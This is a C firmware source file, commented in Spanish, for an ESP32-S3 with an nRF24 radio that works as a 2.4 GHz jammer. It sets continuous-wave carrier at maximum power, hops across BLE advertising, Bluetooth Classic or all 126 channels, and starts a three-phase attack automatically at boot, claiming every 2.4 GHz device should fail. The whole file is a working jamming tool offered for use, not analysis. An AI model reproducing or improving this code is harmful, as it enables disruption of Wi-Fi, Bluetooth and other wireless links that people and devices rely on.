#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/uart.h"
#include "esp_log.h"
#include "esp_random.h"
#include "nrf24_hal.h"

static const char *TAG = "JAMMER_BESTIA";

// ═══════════════════════════════════════════
// PINES - SOLO RADIO 1 (SPI2 - IOMUX REAL)
// ═══════════════════════════════════════════
#define RADIO1_CE    GPIO_NUM_9
#define RADIO1_CSN   GPIO_NUM_10
#define RADIO1_SCK   GPIO_NUM_12
#define RADIO1_MOSI  GPIO_NUM_11
#define RADIO1_MISO  GPIO_NUM_13

// Configuración de la bomba
static nrf24_dev_t radio1;

// Canales de interés (todos los de 2.4GHz)
// Bluetooth Classic: 0-78, BLE: 0-39, WiFi: 1-14
// Usaremos 0 a 125 (todo el rango del NRF24)
#define TOTAL_CHANNELS 126

typedef enum {
    MODE_STOP,
    MODE_BEAST,        // Barrido total 0-125 a máxima velocidad
    MODE_BLE_ADV,      // Solo canales BLE Advertising (2, 26, 80)
    MODE_BT_CLASSIC    // Solo canales Bluetooth Clásico
} jam_mode_t;

static jam_mode_t current_mode = MODE_STOP;
static bool jamming_active = false;
static uint32_t hop_delay_ms = 1; // ¡1ms para máxima agresividad!

// ============================================================
// CONFIGURACIÓN MAESTRA DEL NRF24 (PARA MÁXIMA POTENCIA)
// ============================================================
static void nrf24_configure_max_power(nrf24_dev_t *dev) {
    // 1. Power Up y configurar como transmisor
    nrf24_write_reg(dev, NRF24_REG_CONFIG, NRF24_CFG_PWR_UP | 0x70); // 0x70: 2-byte CRC, EN_CRC, PRIM_RX=0 (TX)
    
    // 2. Desactivar Auto-ACK (para transmisión continua sin esperar respuesta)
    nrf24_write_reg(dev, 0x01, 0x00); // NRF24_EN_AA = 0x01 -> 0x00
    
    // 3. Desactivar todos los pipes de recepción
    nrf24_write_reg(dev, 0x02, 0x00); // NRF24_EN_RXADDR = 0x02 -> 0x00
    
    // 4. Configurar velocidad de datos a 2Mbps (más ancho de banda cubierto)
    // RF_SETUP: 0x0E = 2Mbps, 0dBm. Para Si24R1, 0x0F para +7dBm
    nrf24_write_reg(dev, NRF24_REG_RF_SETUP, NRF24_DR_2MBPS | NRF24_PA_MAX);
    
    // 5. Configurar ancho de dirección y tamaño de payload (necesario para CW)
    nrf24_write_reg(dev, NRF24_REG_SETUP_AW, 0x03); // 5 bytes address width
    nrf24_write_reg(dev, 0x11, 0x02); // NRF24_RX_PW_P0 = 0x11 -> payload de 2 bytes
    
    // 6. Establecer canal inicial
    nrf24_write_reg(dev, NRF24_REG_RF_CH, 0);
    
    // 7. Configurar RF_SETUP para Continuous Wave (CW)
    // 0x80 = CONT_WAVE, 0x10 = PLL_LOCK
    // El PA_MAX se combina para dar la máxima potencia
    uint8_t rf_setup_cw = 0x80 | 0x10 | (NRF24_PA_MAX & 0x06) | NRF24_DR_2MBPS;
    nrf24_write_reg(dev, NRF24_REG_RF_SETUP, rf_setup_cw);
    
    ESP_LOGI(TAG, "NRF24 configurado a MÁXIMA POTENCIA (Modo Continuo)");
}

// ============================================================
// TAREA PRINCIPAL DEL JAMMER (BOMBARDEO)
// ============================================================
static void jammer_task(void *pvParameters) {
    uint8_t channel = 0;
    uint8_t adv_idx = 0;
    uint8_t bt_idx = 0;
    
    // Listas de canales
    const uint8_t ble_adv_channels[] = {2, 26, 80}; // Los 3 canales de advertising BLE
    const uint8_t bt_classic_channels[] = {
        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,
        19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
        37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55,
        56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74,
        75, 76, 77, 78
    };
    const int bt_channels_count = sizeof(bt_classic_channels) / sizeof(bt_classic_channels[0]);

    while (1) {
        if (!jamming_active) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        switch (current_mode) {
            case MODE_BEAST:
                // BARRIDO TOTAL: Salta por TODOS los 125 canales del NRF24
                // Esto cubre todo el espectro de 2.4GHz (WiFi, BT, BLE, RC, etc.)
                nrf24_carrier_hop(&radio1, channel);
                channel = (channel + 1) % TOTAL_CHANNELS;
                // Delay mínimo de 1ms para no bloquear el RTOS (Watchdog)
                vTaskDelay(pdMS_TO_TICKS(1)); 
                break;

            case MODE_BLE_ADV:
                // ATAQUE QUIRÚRGICO BLE: Solo los 3 canales de advertising
                // Es más rápido y efectivo para tumbar dispositivos BLE específicos
                nrf24_carrier_hop(&radio1, ble_adv_channels[adv_idx]);
                adv_idx = (adv_idx + 1) % 3;
                vTaskDelay(pdMS_TO_TICKS(5)); // 5ms para ataque BLE
                break;

            case MODE_BT_CLASSIC:
                // ATAQUE BLUETOOTH CLÁSICO: Recorre los 79 canales
                nrf24_carrier_hop(&radio1, bt_classic_channels[bt_idx]);
                bt_idx = (bt_idx + 1) % bt_channels_count;
                vTaskDelay(pdMS_TO_TICKS(2)); // 2ms para ataque BT
                break;

            default:
                vTaskDelay(pdMS_TO_TICKS(100));
                break;
        }
    }
}

// ============================================================
// SECUENCIA DE ARRANQUE AUTOMÁTICO
// ============================================================
static void auto_start_sequence(void) {
    printf("\n╔════════════════════════════════════════╗\n");
    printf("║   INICIANDO ATAQUE AUTOMÁTICO          ║\n");
    printf("║   MOD: SINGLE NRF24 (SPI2 - IOMUX)     ║\n");
    printf("╚════════════════════════════════════════╝\n");
    
    jamming_active = true;
    
    // Fase 1: Calentamiento BLE (ataque quirúrgico)
    current_mode = MODE_BLE_ADV;
    printf("[1/3] Fase 1: Ataque BLE (canales 2, 26, 80)...\n");
    vTaskDelay(pdMS_TO_TICKS(3000)); // 3 segundos
    
    // Fase 2: Subiendo a Bluetooth Clásico
    current_mode = MODE_BT_CLASSIC;
    printf("[2/3] Fase 2: Atacando Bluetooth Clásico (79 canales)...\n");
    vTaskDelay(pdMS_TO_TICKS(3000)); // 3 segundos
    
    // Fase 3: MODO BESTIA (barrido total)
    current_mode = MODE_BEAST;
    printf("[3/3] ¡¡¡ MODO BESTIA ACTIVADO !!!\n");
    printf(">>> Barrido total de 0 a 125 canales a máxima velocidad.\n");
    printf(">>> TODO dispositivo en 2.4GHz debería fallar ahora.\n\n");
}

// ============================================================
// MENÚ
// ============================================================
static void print_menu(void) {
    printf("\n╔════════════════════════════════════════╗\n");
    printf("║  NRF24 SINGLE JAMMER - ESP32-S3 N16R8 ║\n");
    printf("║       AUTO-START ACTIVADO             ║\n");
    printf("╠════════════════════════════════════════╣\n");
    printf("║  1 = BLE Advertising (2, 26, 80)      ║\n");
    printf("║  2 = Bluetooth Clásico (79 canales)   ║\n");
    printf("║  3 = MODO BESTIA (Barrido total 0-125)║\n");
    printf("║  x = STOP                             ║\n");
    printf("╚════════════════════════════════════════╝\n");
    printf("\n> ");
}

// ============================================================
// FUNCIÓN PRINCIPAL
// ============================================================
void app_main(void) {
    ESP_LOGI(TAG, "=== NRF24 SINGLE JAMMER - ESP-IDF v6.0.3 ===");
    ESP_LOGI(TAG, "Usando SOLO Radio #1 en SPI2 (IOMUX real)");

    // Inicializar Radio 1 (SPI2 - IOMUX real)
    nrf24_pins_t r1_pins = {
        .spi_host = SPI2_HOST, // SPI2 = IOMUX real en ESP32-S3
        .pin_ce   = RADIO1_CE,
        .pin_csn  = RADIO1_CSN,
        .pin_sck  = RADIO1_SCK,
        .pin_mosi = RADIO1_MOSI,
        .pin_miso = RADIO1_MISO,
        .pin_irq  = GPIO_NUM_NC
    };

    esp_err_t err = nrf24_init(&radio1, &r1_pins);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Radio1 FAIL: %s", esp_err_to_name(err));
        ESP_LOGE(TAG, "Revisa el cableado. CE=9, CSN=10, SCK=12, MOSI=11, MISO=13");
    } else {
        ESP_LOGI(TAG, "Radio1 inicializada correctamente en SPI2");
        // ¡APLICAR CONFIGURACIÓN DE MÁXIMA POTENCIA!
        nrf24_configure_max_power(&radio1);
    }

    // Crear tarea jammer
    xTaskCreatePinnedToCore(
        jammer_task,
        "jammer_task",
        4096,
        NULL,
        5,
        NULL,
        0
    );

    // Configurar UART
    const uart_config_t uart_cfg = {
        .baud_rate = 115200,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    uart_driver_install(UART_NUM_0, 256, 0, 0, NULL, 0);
    uart_param_config(UART_NUM_0, &uart_cfg);

    // === ARRANQUE AUTOMÁTICO ===
    vTaskDelay(pdMS_TO_TICKS(500)); // Pequeña pausa para que el USB se estabilice
    auto_start_sequence();          // Arranca la secuencia de ataque automático
    
    print_menu(); // Imprime el menú por si quieres cambiar de modo manualmente

    // Loop de comandos
    uint8_t cmd;
    while (1) {
        int len = uart_read_bytes(UART_NUM_0, &cmd, 1, pdMS_TO_TICKS(100));
        if (len <= 0) continue;

        switch (cmd) {
            case '1': 
                current_mode = MODE_BLE_ADV; 
                jamming_active = true; 
                printf("\n>>> Ataque BLE Advertising (2, 26, 80)\n"); 
                break;

            case '2': 
                current_mode = MODE_BT_CLASSIC; 
                jamming_active = true; 
                printf("\n>>> Ataque Bluetooth Clásico (79 canales)\n"); 
                break;

            case '3': 
                current_mode = MODE_BEAST; 
                jamming_active = true; 
                printf("\n>>> MODO BESTIA MANUAL (0-125)\n"); 
                break;

            case 'x': 
                jamming_active = false; 
                nrf24_stop_carrier(&radio1); 
                printf("\n>>> JAMMING DETENIDO\n"); 
                break;
        }
        uart_flush_input(UART_NUM_0);
    }
}
